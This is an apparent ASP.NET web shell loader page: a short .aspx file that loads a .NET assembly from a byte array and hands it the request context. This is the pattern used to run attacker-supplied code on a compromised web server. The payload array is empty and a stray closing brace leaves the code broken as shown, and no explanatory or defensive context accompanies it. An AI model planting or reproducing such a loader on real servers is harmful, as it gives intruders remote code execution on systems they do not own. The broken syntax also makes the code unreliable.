<%@ Page Language="c#"%>
<%
byte[] data = new byte[] {};
System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(data);
assembly.CreateInstance(assembly.GetTypes()[0].FullName).Equals(Context);
}
%>